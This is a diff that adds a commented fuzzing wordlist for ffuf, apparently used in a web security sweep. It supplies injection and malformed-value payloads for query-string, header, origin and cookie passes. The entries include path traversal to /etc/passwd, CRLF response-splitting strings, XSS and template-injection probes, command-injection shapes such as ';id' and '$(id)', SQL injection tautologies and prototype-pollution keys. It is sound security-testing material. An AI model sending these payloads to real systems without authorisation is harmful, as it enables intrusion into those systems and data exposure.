@@ -1,0 +1,104 @@
+# Injection / malformed-value payloads for the query-string and header passes.
+#
+# Deliberately separate from mochi-paths.txt: a discovery wordlist is paths and
+# filenames, which say nothing as a cookie value, an island props token or an
+# Origin header — and these say nothing as path discovery. Sending each list only
+# to the passes it suits is what keeps the sweep from wasting half its requests.
+#
+# Lines starting with `#` and blank lines are stripped before ffuf sees the file.
+#
+# --- empty / degenerate ---
+=
+;
+;;
+a
+a=b=c
+"
+'
+`
+\
+# --- encoding and traversal, as *values* ---
+..
+../
+..%2f
+..%2f..%2f..%2fetc%2fpasswd
+%2e%2e
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+....//
+....//....//etc/passwd
+..;/
+%00
+..%00
+%0a
+%0d
+%0d%0a
+%c0%af
+%252e%252e%252f
+%25%32%65
+%uFF0E%uFF0E
+/etc/passwd
+file:///etc/passwd
+# --- header-injection / response-splitting ---
+%0d%0aSet-Cookie:%20injected=1
+%0aSet-Cookie:%20injected=1
+x%0d%0aLocation:%20https://evil.test
+foo%0d%0a%0d%0a<html>
+# --- XSS-ish reflection probes ---
+<script>alert(1)</script>
+%3Cscript%3Ealert(1)%3C/script%3E
+"><script>alert(1)</script>
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+onerror=alert(1)
+# --- template / expression injection ---
+{{7*7}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+{{constructor.constructor('return 1')()}}
+# --- command / SQL shapes ---
+|id
+;id
+`id`
+$(id)
+&&id
+' OR '1'='1
+1' OR '1'='1' --
+" OR 1=1--
+%27%20OR%20%271%27%3D%271
+# --- prototype pollution ---
+__proto__
+constructor
+prototype
+__proto__[x]
+# --- oversized / malformed ---
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+%
+%zz
+%%%%
+&&&&
+????
+////////////////////////////////////////
+null
+undefined
+NaN
+-1
+0
+2147483648
+9999999999999999999999
+# --- origin / host shapes (header passes) ---
+null
+http://localhost
+https://evil.test
+http://localhost:1
+://
+not a url
+http://localhost:%
+evil.test:99999
+[::1]:80
+localhost:
+# --- cookie shapes ---
+__Host-x=1; Path=/
+a="quoted; value"
+a=%ZZ
+sid=; sid=; sid=
